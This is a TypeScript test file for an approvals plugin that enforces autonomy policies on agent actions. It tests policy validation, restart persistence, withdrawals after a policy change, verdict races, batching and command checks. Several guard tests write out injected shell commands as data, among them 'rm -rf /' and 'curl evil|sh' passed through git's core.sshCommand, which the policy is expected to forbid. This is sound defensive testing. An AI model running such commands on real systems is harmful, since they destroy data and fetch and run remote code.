// What the conformance suite does not cover: the policy set checked at load (each load-time rule),
// restart persistence, a policy change reaching requests already open, a verdict race on one store
// and across processes, the queue's own clock, the batch bound, paging bounds, records that fail
// their schema, a verdict that fails on its own, the MCP tools' outputs, an applied policy change
// across restarts against the configuration it derives from, and the queue's own proposal from
// repeated approvals.
import { fork } from 'node:child_process'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { Context } from '@deepseek-ai/cordis'
import { type Action, type ApprovalRequest, ApprovalsError, type AutonomyPolicy, type NewRequest, type PolicyChange, type Subject, type VerdictResult } from '@tsuuanmi/system-approvals-core'
import Artifacts from '@tsuuanmi/system-artifacts'
import EventLog from '@tsuuanmi/system-event-log'
import { McpTools, type ToolHandler, type ToolSpec } from '@tsuuanmi/system-gateway-core'
import { SchemaError, SchemaRegistry } from '@tsuuanmi/system-libs'
import Store from '@tsuuanmi/system-store'
import { describe, expect, it, onTestFinished, vi } from 'vitest'
import { z as zod } from 'zod'
import { POLICIES } from '../../../approvals-core/conformance/approvals.ts'
import StoreApprovals, { checkConfig, type Config, policyProblems, type RepeatedApprovals } from '../src/index.ts'
import { APPROVAL_TOOLS, type ApprovalTool, INPUTS } from '../src/tools.ts'
import { ManualApprovals } from './manual.ts'

/** A `ctx.mcp` that keeps contributed tools, so a test calls a handler as a given scope would. */
class RecordingMcp extends McpTools {
  readonly tools = new Map<string, { spec: ToolSpec; handler: ToolHandler }>()
  tool(name: string, spec: ToolSpec, handler: ToolHandler): void {
    this.tools.set(name, { spec, handler })
  }
}

const T0 = new Date('2026-10-22T09:00:00Z')
const after = (seconds: number, from: Date = T0): Date => new Date(from.getTime() + seconds * 1000)
const schemas = new SchemaRegistry()
const subject = (ref: string, version = 'v1'): Subject => ({ type: 'content', ref, version })
const [STUDIO, PROJECT, NO_COMMANDS] = POLICIES as [AutonomyPolicy, AutonomyPolicy, AutonomyPolicy]
const { batch: _, ...UNBATCHED } = STUDIO

const tempDir = (): string => {
  const dir = mkdtempSync(join(tmpdir(), 'system-approvals-'))
  onTestFinished(() => rmSync(dir, { recursive: true, force: true }))
  return dir
}

interface Booted { ctx: Context; dir: string; approvals: StoreApprovals; mcp: () => RecordingMcp; stop: () => Promise<void> }

/** A provider over a fresh or given store; its own clock is off unless `clock` (the test names the times). */
async function boot(options: { dir?: string; config?: Partial<Config>; eventLog?: boolean; mcp?: boolean; clock?: boolean } = {}): Promise<Booted> {
  const dir = options.dir ?? tempDir()
  const ctx = new Context()
  const fibers = [
    ctx.plugin(Store, { path: join(dir, 'system.db') }), ctx.plugin(Artifacts, {}), ...(options.eventLog ? [ctx.plugin(EventLog, {})] : []),
    ...(options.mcp ? [ctx.plugin(RecordingMcp)] : []), ctx.plugin(options.clock ? StoreApprovals : ManualApprovals, { policies: POLICIES, ...options.config }),
  ]
  await Promise.all(fibers)
  // Optional seams (ctx.mcp) are taken once the fiber settles.
  await new Promise((resolve) => setTimeout(resolve, 0))
  let stopped = false
  const stop = async () => {
    if (stopped) return
    stopped = true
    for (const fiber of [...fibers].reverse()) await fiber.dispose()
    await new Promise((resolve) => setImmediate(resolve))
  }
  onTestFinished(stop)
  return { ctx, dir, approvals: ctx.approvals as StoreApprovals, mcp: () => (ctx as unknown as { mcp: RecordingMcp }).mcp, stop }
}

async function asked(ctx: Context, action: Action, ref: string, at: Date = T0, extra: Partial<NewRequest> = {}): Promise<ApprovalRequest> {
  const verdict = await ctx.approvals.check(action)
  expect(verdict.mode).toBe('ask')
  return ctx.approvals.request({
    subject: subject(ref), action: { class: action.class, summary: `do ${ref}` }, requester: { component: 'board', runId: `run-${ref}`, ...(action.projectId ? { projectId: action.projectId } : {}) },
    verdict, classification: 'operator-shared', ...extra,
  }, at)
}

/** The messages of one level logged anywhere in the context from now on. */
const logged = (ctx: Context, type: 'error' | 'warn'): string[] => {
  const messages: string[] = []
  ctx.logger.exporter({ levels: { default: 3 }, export: (m) => { if (m.type === type) messages.push(m.args[0] instanceof Error ? m.args[0].message : String(m.args[0])) } })
  return messages
}

const failureOf = async (call: Promise<unknown>): Promise<string> => {
  try {
    await call
    return 'resolved'
  } catch (error) {
    return error instanceof ApprovalsError ? error.failure : `not an ApprovalsError: ${String(error)}`
  }
}

describe('configuration', () => {
  it('refuses a policy set that breaks a load-time rule or the schema, naming the policy and the rule (docs/reference/schemas.md#autonomy-policy)', () => {
    const cases: Array<[unknown, RegExp]> = [
      [[{ ...STUDIO, rules: [...STUDIO.rules, { actionClass: 'read', mode: 'ask' }] }], /^policy studio: more than one rule for read$/],
      [[{ ...STUDIO, rules: [{ actionClass: 'read', mode: 'auto' }], expiry: { defaultSeconds: 7200, maxSeconds: 3600 } }], /^policy studio: expiry\.defaultSeconds \(7200\) is more than expiry\.maxSeconds \(3600\)$/],
      [[{ ...STUDIO, expiry: { defaultSeconds: 120, maxSeconds: 300 } }], /^policy studio: the command rule expires after 600 s, more than expiry\.maxSeconds \(300\)$/],
      [[PROJECT], /^exactly one studio policy is needed; 0 configured$/],
      [[STUDIO, { ...STUDIO, id: 'studio-2' }], /^exactly one studio policy is needed; 2 configured$/],
      [[STUDIO, { ...PROJECT, narrows: 'elsewhere' }], /^policy p1\.policy: narrows elsewhere, which is not a configured studio policy$/],
      [[STUDIO, PROJECT, { ...PROJECT, id: 'p1.second' }], /^policy p1\.second: project p1 already has a policy$/],
      [[STUDIO, { ...PROJECT, id: 'studio' }], /^policy studio: another policy has the same id$/],
      // What the schema itself refuses: an irreversible class that runs on its own, a default that does not fail closed.
      [[{ ...STUDIO, rules: [{ actionClass: 'deploy', mode: 'auto' }] }], /^policy studio: autonomy-policy@1\.0: /],
      [[{ ...STUDIO, rules: [{ actionClass: 'promotion', mode: 'notify' }] }], /^policy studio: autonomy-policy@1\.0: /],
      [[{ ...STUDIO, default: 'auto' }], /^policy studio: autonomy-policy@1\.0: /],
      [[{ ...PROJECT, scope: 'studio' }], /^policy p1\.policy: autonomy-policy@1\.0: /],
      ['studio', /^policies must be a list of autonomy-policy@1\.0 records$/],
      // Remediation always asks: a load-time rule, since the record's schema predates it.
      [[{ ...STUDIO, rules: [{ actionClass: 'remediation', mode: 'auto' }] }], /^policy studio: remediation always asks; its rule may not say auto$/],
      [[{ ...STUDIO, rules: [{ actionClass: 'remediation', mode: 'notify' }] }], /^policy studio: remediation always asks; its rule may not say notify$/],
      // A merge always asks (D56, ADR-0060): a load-time rule too, in a studio policy or a project's.
      [[{ ...STUDIO, rules: [{ actionClass: 'merge', mode: 'auto' }] }], /^policy studio: merge always asks; its rule may not say auto$/],
      [[STUDIO, { ...PROJECT, rules: [{ actionClass: 'merge', mode: 'notify' }] }], /^policy p1\.policy: merge always asks; its rule may not say notify$/],
      // A commands entry is whole words, none empty, none with a shell metacharacter.
      [[{ ...STUDIO, commands: [' '] }], /^policy studio: the commands entry " " has an empty word/],
      [[{ ...STUDIO, commands: ['pnpm  test'] }], /^policy studio: the commands entry "pnpm  test" has an empty word/],
      [[{ ...STUDIO, commands: ['git status;'] }], /^policy studio: the commands entry "git status;" has a shell metacharacter in "status;"$/],
      [[{ ...STUDIO, commands: ['ls ~'] }], /^policy studio: the commands entry "ls ~" has a shell metacharacter in "~"$/],
      // A lone request waits maxWaitSeconds to be batched: it must be under the shortest expiry it can get.
      [[{ ...STUDIO, batch: { maxSize: 2, maxWaitSeconds: 600 } }], /^policy studio: batch\.maxWaitSeconds \(600\) is not under the shortest expiry of the studio's requests \(600 s\)/],
      [[UNBATCHED, { ...PROJECT, batch: { maxSize: 2, maxWaitSeconds: 3600 } }], /^policy p1\.policy: batch\.maxWaitSeconds \(3600\) is not under the shortest expiry of project p1's requests \(400 s\)/],
      // A set is bounded (INV-9): the studio's policy and 100 projects'.
      [[STUDIO, ...Array.from({ length: 101 }, (_, i) => ({ ...PROJECT, id: `p${i}.policy`, projectId: `p${i}` }))], /^a set holds at most 101 policies \(the studio's and 100 projects'\); 102 configured$/],
    ]
    for (const [policies, problem] of cases) expect(policyProblems(policies), JSON.stringify(policies).slice(0, 120)).toContainEqual(expect.stringMatching(problem))
    expect(policyProblems(POLICIES)).toEqual([])
    // The `system check` preflight names every problem, as the plugin would refuse it.
    expect(checkConfig({ policies: POLICIES })).toEqual([])
    expect(checkConfig({ policies: [PROJECT] })).toEqual(['exactly one studio policy is needed; 0 configured', 'policy p1.policy: narrows studio, which is not a configured studio policy'])
    expect(checkConfig({})).toEqual(['policies must be a list of autonomy-policy@1.0 records'])
    // The Config schema itself refuses a row with no policies at all, and a clock that is off: every request expires (INV-9).
    expect(() => StoreApprovals.Config({ sweepSeconds: 60 } as unknown as Config)).toThrow(/policies/)
    expect(() => StoreApprovals.Config({ policies: POLICIES, sweepSeconds: 0 })).toThrow(/sweepSeconds/)
    expect(StoreApprovals.Config({ policies: POLICIES }).sweepSeconds).toBe(60)
  })

  it('provides no ctx.approvals when the policy set is refused, and logs why (fail-closed rule 5, INV-2)', async () => {
    const ctx = new Context()
    const errors = logged(ctx, 'error')
    const store = ctx.plugin(Store, { path: join(tempDir(), 'system.db') })
    await store
    onTestFinished(() => store.dispose())
    const artifacts = ctx.plugin(Artifacts, {})
    await artifacts
    onTestFinished(() => artifacts.dispose())
    for (const policies of [[PROJECT], [{ ...STUDIO, expiry: { defaultSeconds: 120, maxSeconds: 300 } }], []]) {
      const fiber = ctx.plugin(ManualApprovals, { policies })
      const error = await Promise.resolve(fiber).then(() => undefined, (e: unknown) => e)
      expect(String((error as Error | undefined)?.message)).toMatch(/approvals: the autonomy policies are refused, so no ctx\.approvals is provided/)
      expect(ctx.get('approvals')).toBeUndefined()
      await fiber.dispose()
    }
    expect(errors.filter((m) => m.includes('the autonomy policies are refused'))).toHaveLength(3)
    // Nothing was stored for a refused set: its migration never ran.
    expect(ctx.store.db.prepare("SELECT name FROM sqlite_master WHERE name = 'approval_requests'").get()).toBeUndefined()
  })

  it('reports the effective mode of every action class, the studio\'s policy first, and copies that a caller cannot change', async () => {
    const { ctx } = await boot()
    const { policies, effective } = await ctx.approvals.policy('p1')
    expect(policies.map((p) => p.id)).toEqual(['studio', 'p1.policy'])
    expect(effective.map((e) => e.actionClass)).toEqual(['read', 'workspace-write', 'merge', 'command', 'external-send', 'deploy', 'delete-data', 'spend', 'charter', 'funding', 'remediation', 'policy-change', 'promotion', 'dispatch'])
    policies[0]!.rules.length = 0
    expect((await ctx.approvals.policy()).policies[0]!.rules).toHaveLength(STUDIO.rules.length)
    // No project policy: the studio's alone.
    expect((await ctx.approvals.policy('p9')).policies.map((p) => p.id)).toEqual(['studio'])
  })
})

describe('restart', () => {
  it('a new provider over the same store has the same requests, batches, and expiries, and goes on from them (INV-4)', async () => {
    const first = await boot()
    const merge = await asked(first.ctx, { class: 'merge' }, 'merge')
    const command = await asked(first.ctx, { class: 'command', command: ['git', 'push'] }, 'push')
    const deploy = await asked(first.ctx, { class: 'deploy', projectId: 'p1' }, 'deploy')
    const [batchId, ...more] = await first.ctx.approvals.batch(after(20))
    expect(more).toEqual([])
    const before = await first.ctx.approvals.list({ states: ['open', 'batched', 'approved', 'rejected'] })
    expect(before.map((r) => [r.requestId, r.state, r.batchId])).toEqual([
      [command.requestId, 'batched', batchId], [merge.requestId, 'batched', batchId], [deploy.requestId, 'open', undefined],
    ])
    await first.stop()

    const second = await boot({ dir: first.dir })
    expect(await second.ctx.approvals.list({ states: ['open', 'batched', 'approved', 'rejected'] })).toEqual(before)
    for (const r of before) expect(await second.ctx.approvals.get(r.requestId)).toEqual(r)
    // p1's request batches once its oldest waited the studio's maxWaitSeconds (300 s), counted from its stored creation.
    expect(await second.ctx.approvals.batch(after(299))).toEqual([])
    const [late] = await second.ctx.approvals.batch(after(300))
    expect((await second.ctx.approvals.get(deploy.requestId))).toMatchObject({ state: 'batched', batchId: late, revision: 1 })
    // The command's stored expiry (600 s) still rejects it, once.
    expect(await second.ctx.approvals.sweep(after(599))).toEqual([])
    expect((await second.ctx.approvals.sweep(after(600))).map((r) => [r.requestId, r.resolution?.cause])).toEqual([[command.requestId, 'expired']])
    expect(await second.ctx.approvals.sweep(after(600))).toEqual([])
    const [approved] = await second.ctx.approvals.decide([{ requestId: merge.requestId, subject: merge.subject, verdict: 'approved' }], after(700))
    expect(approved).toMatchObject({ state: 'approved' })
    expect(await second.ctx.approvals.get(merge.requestId)).toMatchObject({ state: 'approved', batchId, revision: 2, resolution: { cause: 'verdict', approval: approved!.approval } })
  })

  it('rejects at start what expired while it was down: a restart is a sweep (INV-4)', async () => {
    const first = await boot()
    const stale = await asked(first.ctx, { class: 'merge' }, 'stale', after(-7200, new Date()))
    await first.stop()
    const second = await boot({ dir: first.dir, clock: true, config: { sweepSeconds: 3600 } })
    await vi.waitFor(async () => expect((await second.ctx.approvals.get(stale.requestId))?.resolution?.cause).toBe('expired'), { timeout: 5000, interval: 50 })
  })
})

describe('a policy change', () => {
  const now = (): Date => new Date()
  const withRule = (policy: AutonomyPolicy, rule: AutonomyPolicy['rules'][number], version = policy.version): AutonomyPolicy =>
    ({ ...policy, version, rules: [...policy.rules.filter((r) => r.actionClass !== rule.actionClass), rule] })
  const reasonOf = (ctx: Context, request: ApprovalRequest | undefined): { decider: unknown; selected: string[] } => {
    const body = ctx.artifacts.get(request!.resolution!.decision)!.body as { decider: unknown; candidates: Array<{ selected: boolean; reasons: string[] }> }
    return { decider: body.decider, selected: body.candidates.find((c) => c.selected)!.reasons }
  }

  it('refuses a request citing a decision made under another policy set: an older version, or an edit that kept its version (S1)', async () => {
    const first = await boot()
    const deploy = await first.ctx.approvals.check({ class: 'deploy' })
    const merge = await first.ctx.approvals.check({ class: 'merge' })
    await first.stop()
    const queue = (ctx: Context, verdict: typeof deploy, actionClass: Action['class']) => ctx.approvals.request({
      subject: subject('x'), action: { class: actionClass, summary: 'x' }, requester: { component: 'board', runId: 'run-x' }, verdict, classification: 'public',
    }, now())
    // Version 4 forbids deploy: the version 3 ask is refused, and so is a version 3 ask for merge, which still asks.
    const second = await boot({ dir: first.dir, config: { policies: [withRule(STUDIO, { actionClass: 'deploy', mode: 'forbid' }, 4), PROJECT, NO_COMMANDS] } })
    await expect(queue(second.ctx, deploy, 'deploy')).rejects.toThrow(/studio's at version 3, which is not a policy of the studio now/)
    expect(await failureOf(queue(second.ctx, merge, 'merge'))).toBe('not-asked')
    await second.stop()
    // An edit that keeps version 3 changes the set's hash: decisions made before it are refused too.
    const third = await boot({ dir: first.dir, config: { policies: [withRule(STUDIO, { actionClass: 'spend', mode: 'forbid' }), PROJECT, NO_COMMANDS] } })
    await expect(queue(third.ctx, merge, 'merge')).rejects.toThrow(/made under other policies than the studio's, as loaded now/)
    // A check under the set loaded now is queued.
    expect(await asked(third.ctx, { class: 'merge' }, 'merge', now())).toMatchObject({ state: 'open', policy: { id: 'studio', version: 3 } })
  })

  it('withdraws at load every open request the new policies no longer ask for, with the reason, and keeps the rest (S1)', async () => {
    const first = await boot()
    const deploy = await asked(first.ctx, { class: 'deploy' }, 'deploy', now())
    const merge = await asked(first.ctx, { class: 'merge' }, 'merge', now())
    const p1 = await asked(first.ctx, { class: 'deploy', projectId: 'p1' }, 'p1-deploy', now())
    const expired = await asked(first.ctx, { class: 'merge' }, 'expired', after(-7200, now()))
    await first.stop()

    // p1's next version forbids deploy: p1's deploy request is withdrawn before any sweep; the studio's stay open.
    const second = await boot({ dir: first.dir, config: { policies: [STUDIO, withRule(PROJECT, { actionClass: 'deploy', mode: 'forbid' }, 2), NO_COMMANDS] } })
    const withdrawn = await second.ctx.approvals.get(p1.requestId)
    expect(withdrawn).toMatchObject({ state: 'rejected', revision: 1, resolution: { cause: 'withdrawn' } })
    expect(withdrawn!.resolution!.approval).toBeUndefined()
    expect(reasonOf(second.ctx, withdrawn)).toEqual({ decider: { type: 'rule', id: 'approvals.policy', version: '1' }, selected: ['the policy changed: it now gives deploy forbid'] })
    for (const r of [deploy, merge]) expect(await second.ctx.approvals.get(r.requestId)).toEqual(r)
    // One already expired is left for the sweep, which denies it as expired.
    expect((await second.ctx.approvals.get(expired.requestId))?.state).toBe('open')
    expect((await second.ctx.approvals.sweep(now())).map((r) => [r.requestId, r.resolution?.cause])).toEqual([[expired.requestId, 'expired']])
    await second.stop()

    // A new studio version: every open request of the studio's policy is withdrawn, whatever its class asks now.
    const third = await boot({ dir: first.dir, config: { policies: [{ ...STUDIO, version: 4 }, PROJECT, NO_COMMANDS] } })
    for (const r of [deploy, merge]) {
      const now = await third.ctx.approvals.get(r.requestId)
      expect(now).toMatchObject({ state: 'rejected', resolution: { cause: 'withdrawn' } })
      expect(reasonOf(third.ctx, now).selected).toEqual(['the policy changed: studio at version 3 is not a policy of the studio now'])
    }
    // A verdict that comes after changes nothing.
    expect((await third.ctx.approvals.decide([{ requestId: merge.requestId, subject: merge.subject, verdict: 'approved' }], now()))[0]).toMatchObject({ state: 'rejected', refused: 'already-resolved' })
  })

  it('withdraws on a sweep what a provider with older policies queued after this one loaded (S1)', async () => {
    const older = await boot()
    const newer = await boot({ dir: older.dir, config: { policies: [{ ...STUDIO, version: 4 }, PROJECT, NO_COMMANDS] } })
    const late = await asked(older.ctx, { class: 'merge' }, 'late', now())
    const swept = await newer.ctx.approvals.sweep(now())
    expect(swept.map((r) => [r.requestId, r.state, r.resolution?.cause])).toEqual([[late.requestId, 'rejected', 'withdrawn']])
    expect(await newer.ctx.approvals.sweep(now())).toEqual([])
  })
})

describe('the queue\'s own clock', () => {
  it('sweeps and batches every sweepSeconds with no caller: an expired request is denied, an open one that waited is batched (INV-2, INV-9)', async () => {
    const { ctx } = await boot({ clock: true, config: { sweepSeconds: 1 } })
    const now = new Date()
    const expired = await asked(ctx, { class: 'command' }, 'expired', after(-3600, now))
    const waited = await asked(ctx, { class: 'merge' }, 'waited', after(-600, now))
    await vi.waitFor(async () => {
      expect(await ctx.approvals.get(expired.requestId)).toMatchObject({ state: 'rejected', resolution: { cause: 'expired' } })
      expect(await ctx.approvals.get(waited.requestId)).toMatchObject({ state: 'batched' })
    }, { timeout: 5000, interval: 100 })
    const resolution = (await ctx.approvals.get(expired.requestId))!.resolution!
    expect(resolution.approval).toBeUndefined()
    expect(ctx.artifacts.get(resolution.decision)?.body).toMatchObject({ decisionType: 'approval', outcome: { option: 'denied:expired' }, decider: { type: 'rule', id: 'approvals.expiry' } })
  })
})

describe('concurrency', () => {
  it('lets one of concurrent verdicts on a request win, on one provider and on two over the same store; the other is already-resolved (INV-5)', async () => {
    const one = await boot()
    const request = await asked(one.ctx, { class: 'merge' }, 'race')
    const results = await Promise.all([
      one.ctx.approvals.decide([{ requestId: request.requestId, subject: request.subject, verdict: 'approved' }], after(1)),
      one.ctx.approvals.decide([{ requestId: request.requestId, subject: request.subject, verdict: 'rejected' }], after(1)),
    ])
    expect(results.flat().map((r) => r.refused ?? r.state)).toEqual(['approved', 'already-resolved'])

    const two = await boot({ dir: one.dir })
    const next = await asked(one.ctx, { class: 'deploy' }, 'race-2')
    const across = await Promise.all([one.ctx, two.ctx].map((ctx, i) => ctx.approvals.decide([{ requestId: next.requestId, subject: next.subject, verdict: i ? 'approved' : 'rejected' }], after(1))))
    expect(across.flat().filter((r) => r.refused === 'already-resolved')).toHaveLength(1)
    expect((await two.ctx.approvals.get(next.requestId))?.revision).toBe(1)
  })

  it('lets exactly one of several processes deciding the same request record its verdict (BEGIN IMMEDIATE)', async () => {
    const { ctx, dir } = await boot()
    const request = await asked(ctx, { class: 'merge' }, 'race-processes')
    const worker = fileURLToPath(new URL('./race-worker.ts', import.meta.url))
    const verdicts = ['approved', 'rejected', 'approved', 'rejected'] as const
    const children = verdicts.map((verdict) => fork(worker, [join(dir, 'system.db'), request.requestId, JSON.stringify(request.subject), verdict, JSON.stringify(POLICIES)], {
      execArgv: ['--import', 'tsx'], stdio: ['ignore', 'inherit', 'inherit', 'ipc'],
    }))
    const results = children.map((child) => new Promise<VerdictResult>((resolve, reject) => {
      child.on('message', (m) => m !== 'ready' && resolve(JSON.parse(String(m)) as VerdictResult))
      child.on('exit', (code) => code !== 0 && reject(new Error(`race worker exited ${code}`)))
    }))
    await Promise.all(children.map((child) => new Promise<void>((resolve) => child.on('message', (m) => m === 'ready' && resolve()))))
    for (const child of children) child.send('go')
    const settled = await Promise.all(results)
    const winners = settled.filter((r) => r.refused === undefined)
    expect(winners).toHaveLength(1)
    expect(settled.filter((r) => r.refused === 'already-resolved')).toHaveLength(3)
    const stored = await ctx.approvals.get(request.requestId)
    expect(stored).toMatchObject({ state: winners[0]!.state, revision: 1, resolution: { cause: 'verdict', approval: winners[0]!.approval } })
    // One verdict, one approval decision for the request.
    expect(ctx.artifacts.list({ kind: 'decision', decisionType: 'approval' }).filter((e) => (e.body as { outcome: { detail: { requestId: string } } }).outcome.detail.requestId === request.requestId)).toHaveLength(1)
  }, 120_000)
})

describe('batches', () => {
  it('puts at most maxSize requests in a batch, oldest first, with an approvals.batched event each, and never batches an expired one (INV-9)', async () => {
    const { ctx } = await boot({ eventLog: true })
    const merges: ApprovalRequest[] = []
    for (let i = 0; i < 4; i++) merges.push(await asked(ctx, { class: 'merge' }, `m${i}`, after(i)))
    const command = await asked(ctx, { class: 'command' }, 'command')
    // Oldest first, two at most (the studio's maxSize): m0 and the command (both made at T0), then m1
    // and m2. m3 alone is fewer than maxSize, and at 10 s it has waited 7 of its 300 s.
    const made = await ctx.approvals.batch(after(10))
    expect(made).toHaveLength(2)
    const members = await Promise.all(made.map(async (batchId) => (await ctx.approvals.list({ batchId })).map((r) => r.requestId).sort()))
    expect(members).toEqual([[merges[0]!.requestId, command.requestId].sort(), [merges[1]!.requestId, merges[2]!.requestId].sort()])
    expect((await ctx.approvals.get(merges[3]!.requestId))?.state).toBe('open')
    const events = ctx.eventLog.query({ type: 'approvals.batched' })
    expect(events.map((e) => e.data?.batchId)).toEqual(made)
    expect(events.map((e) => [...(e.data!.requests as string[])].sort())).toEqual(members)
    // An open request already expired at the batch's time is left for the sweep, never shown to the
    // operator; m3, which has waited long enough by then, is batched on its own.
    const late = await asked(ctx, { class: 'command' }, 'late', after(20))
    const [alone, ...none] = await ctx.approvals.batch(after(620))
    expect(none).toEqual([])
    expect((await ctx.approvals.list({ batchId: alone! })).map((r) => r.requestId)).toEqual([merges[3]!.requestId])
    expect((await ctx.approvals.get(late.requestId))?.state).toBe('open')
    expect((await ctx.approvals.sweep(after(620))).map((r) => r.requestId)).toEqual([command.requestId, late.requestId])
  })
})

describe('events', () => {
  it('appends approvals.requested and approvals.resolved with the change that names them, ids and the class only, never the summary (docs/design/notifications.md, REQ-HOST-9)', async () => {
    const { ctx } = await boot({ eventLog: true })
    const merged = await asked(ctx, { class: 'deploy', projectId: 'p1' }, 'm1')
    const lapsed = await asked(ctx, { class: 'command' }, 'c1')
    const requested = ctx.eventLog.query({ type: 'approvals.requested' })
    expect(requested.map((e) => e.data)).toEqual([
      { requestId: merged.requestId, actionClass: 'deploy', expiresAt: merged.expiresAt, component: 'board', projectId: 'p1' },
      { requestId: lapsed.requestId, actionClass: 'command', expiresAt: lapsed.expiresAt, component: 'board' },
    ])
    expect(JSON.stringify(requested)).not.toContain('do m1')
    await ctx.approvals.decide([{ requestId: merged.requestId, subject: merged.subject, verdict: 'approved' }], after(5))
    await ctx.approvals.sweep(new Date(Date.parse(lapsed.expiresAt) + 1000))
    const resolved = ctx.eventLog.query({ type: 'approvals.resolved' })
    expect(resolved.map((e) => e.data)).toEqual([
      { requestId: merged.requestId, state: 'approved', cause: 'verdict', option: 'approved' },
      { requestId: lapsed.requestId, state: 'rejected', cause: 'expired', option: 'denied:expired' },
    ])
    // Each names the request's own approval decision.
    expect(resolved.map((e) => e.decision)).toEqual([(await ctx.approvals.get(merged.requestId))!.resolution!.decision, (await ctx.approvals.get(lapsed.requestId))!.resolution!.decision])
  })

  it('makes the change all the same when the event cannot be appended, and logs it', async () => {
    const { ctx } = await boot({ eventLog: true })
    const warnings = logged(ctx, 'warn')
    const append = vi.spyOn(ctx.eventLog, 'append').mockImplementation(() => { throw new Error('store busy') })
    const request = await asked(ctx, { class: 'merge' }, 'm1')
    expect((await ctx.approvals.get(request.requestId))?.state).toBe('open')
    append.mockRestore()
    expect(warnings.some((w) => w.includes('approvals.requested') && w.includes('store busy'))).toBe(true)
  })
})

describe('guards', () => {
  it('queues a request only on a recorded autonomy decision that says ask, of the policy the verdict names (INV-2, INV-13)', async () => {
    const { ctx } = await boot()
    const verdict = await ctx.approvals.check({ class: 'merge' })
    const request = (v: typeof verdict): NewRequest => ({ subject: subject('x'), action: { class: 'merge', summary: 'x' }, requester: { component: 'board', runId: 'run-x' }, verdict: v, classification: 'public' })
    expect(await failureOf(ctx.approvals.request(request({ ...verdict, policy: { id: 'p1.policy', version: 1 } }), T0))).toBe('not-asked')
    expect(await failureOf(ctx.approvals.request(request({ ...verdict, policy: { ...verdict.policy, version: 4 } }), T0))).toBe('not-asked')
    const approval = ctx.artifacts.put({ kind: 'approval', bodySchema: 'approval@1.0', body: { schema: 'approval@1.0', subject: subject('x'), verdict: 'approved', by: 'operator' }, classification: 'operator-shared', producer: { type: 'operator', ref: 'operator' } })
    expect(await failureOf(ctx.approvals.request(request({ ...verdict, decision: approval.id as typeof verdict.decision }), T0))).toBe('not-asked')
    // A request the schema refuses is refused whole, and nothing is stored.
    expect(await failureOf(ctx.approvals.request({ ...request(verdict), requester: { component: 'board' } }, T0))).toBe('invalid')
    expect(await failureOf(ctx.approvals.request(request(verdict), new Date('not a date')))).toBe('invalid')
    expect(await ctx.approvals.list({ states: ['open', 'batched', 'approved', 'rejected'] })).toEqual([])
  })

  it('queues a request only on a decision a policy made, judging the action again with its command (B1)', async () => {
    const { ctx } = await boot()
    const verdict = await ctx.approvals.check({ class: 'merge' })
    const request = (v: typeof verdict, extra: Partial<NewRequest> = {}): NewRequest => ({ subject: subject('x'), action: { class: 'merge', summary: 'x' }, requester: { component: 'board', runId: 'run-x' }, verdict: v, classification: 'public', ...extra })
    // The policy's decision, put again by someone else: it says ask, but no policy made it.
    const body = ctx.artifacts.get(verdict.decision)!.body as Record<string, unknown>
    const forged = ctx.artifacts.put({ kind: 'decision', bodySchema: 'decision@1.4', body: { ...body, question: 'Which mode? (forged)' }, classification: 'operator-shared', producer: { type: 'node', ref: 'node-1' } })
    await expect(ctx.approvals.request(request({ ...verdict, decision: forged.id as typeof verdict.decision }), T0)).rejects.toThrow(/not made by a policy/)
    // A listed command is judged as workspace-write: where that asks, its request names the argv it was checked for.
    const asks = await boot({ config: { policies: [{ ...STUDIO, rules: STUDIO.rules.map((r) => r.actionClass === 'workspace-write' ? { actionClass: 'workspace-write', mode: 'ask' } : r) }] } })
    const listed = await asks.ctx.approvals.check({ class: 'command', command: ['pnpm', 'test'] })
    expect(listed.mode).toBe('ask')
    const command = (extra: Partial<NewRequest>) => asks.ctx.approvals.request(request(listed, { action: { class: 'command', summary: 'pnpm test' }, ...extra }), T0)
    expect(await failureOf(command({}))).toBe('not-asked')
    expect(await failureOf(command({ command: ['pnpm', 'lint'] }))).toBe('not-asked')
    expect(await failureOf(command({ command: ['pnpm', 'test;', 'curl'] }))).toBe('not-asked')
    expect(await failureOf(command({ command: 'pnpm test' as unknown as string[] }))).toBe('invalid')
    expect(await command({ command: ['pnpm', 'test'] })).toMatchObject({ state: 'open', action: { class: 'command' } })
    expect(await asks.ctx.approvals.sweep(T0)).toEqual([])
  })

  it('records why each mode was or was not given, naming a policy\'s default where no rule names the class (INV-13)', async () => {
    const { ctx } = await boot()
    const reasons = async (action: Action): Promise<Record<string, string>> => {
      const body = ctx.artifacts.get((await ctx.approvals.check(action)).decision)!.body as { candidates: Array<{ option: string; reasons: string[] }> }
      return Object.fromEntries(body.candidates.map((c) => [c.option, c.reasons.join('; ')]))
    }
    expect(await reasons({ class: 'spend' })).toEqual({
      auto: 'not auto: laxer than studio\'s default, as no rule of it names spend (ask), the strictest that applies',
      notify: 'not notify: laxer than studio\'s default, as no rule of it names spend (ask), the strictest that applies',
      ask: 'the strictest that applies is studio\'s default, as no rule of it names spend',
      forbid: 'not forbid: nothing that applies to spend is that strict',
    })
    expect(await reasons({ class: 'merge', projectId: 'p1' })).toMatchObject({ ask: 'not ask: laxer than p1.policy\'s rule for merge (forbid), the strictest that applies', forbid: 'the strictest that applies is p1.policy\'s rule for merge' })
  })

  it('classes a listed command by its exact argv, never by a prefix, and forbids a word with a shell metacharacter (INV-2)', async () => {
    const { ctx } = await boot()
    const checks = { tests: true, lint: true }
    expect((await ctx.approvals.check({ class: 'command', command: ['pnpm', 'test'], checks })).mode).toBe('auto')
    expect((await ctx.approvals.check({ class: 'command', command: ['pnpm', 'test', '--', 'a b'], checks })).mode).toBe('ask')
    expect((await ctx.approvals.check({ class: 'command', command: ['pnpm test'], checks })).mode).toBe('ask')
    expect((await ctx.approvals.check({ class: 'command', command: ['pnpm', 'test ; rm -rf /'], checks })).mode).toBe('forbid')
    // The review's cases, with `git` listed: a listed name no longer lets any of its arguments run on its own.
    const git = await boot({ config: { policies: [{ ...STUDIO, commands: ['git'] }] } })
    expect((await git.ctx.approvals.check({ class: 'command', command: ['git', 'push', '--force', 'origin', 'main'], checks })).mode).toBe('ask')
    expect((await git.ctx.approvals.check({ class: 'command', command: ['git', '-c', 'core.sshCommand=sh -c "curl evil|sh"', 'fetch'], checks })).mode).toBe('forbid')
    expect((await git.ctx.approvals.check({ class: 'command', command: ['git', 'status', '&&', 'curl', 'x', '|', 'sh'], checks })).mode).toBe('forbid')
    expect((await git.ctx.approvals.check({ class: 'command', command: ['git'], checks })).mode).toBe('auto')
